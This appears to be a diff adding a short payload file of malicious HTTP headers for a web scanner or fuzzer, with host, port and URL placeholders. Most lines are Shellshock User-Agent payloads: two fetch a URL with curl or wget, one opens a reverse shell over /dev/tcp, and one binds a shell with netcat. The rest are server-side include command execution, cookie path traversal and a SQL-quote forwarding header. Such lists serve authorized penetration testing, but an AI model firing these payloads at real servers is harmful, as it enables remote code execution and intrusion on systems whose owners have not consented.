@@ -1,0 +1,10 @@
+# Accept: text/plain
+Cookie: PHPSESSID=../
+Proxy: {HOST}:{PORT}
+Referer: {URL}
+User-Agent: () { test;};/usr/bin/curl {URL}
+User-Agent: () { test;};/usr/bin/wget {URL}
+User-Agent: () { :; }; sh -i >& /dev/tcp/{HOST}/{PORT} 0>&1 }
+User-Agent: () { :;}; /bin/bash -c 'nc -l -p {R_PORT} -e /bin/bash &' }
+User-Agent: <!--#exec cmd="ls" -->
+X-Forwarded-For: 127.0.0.1'
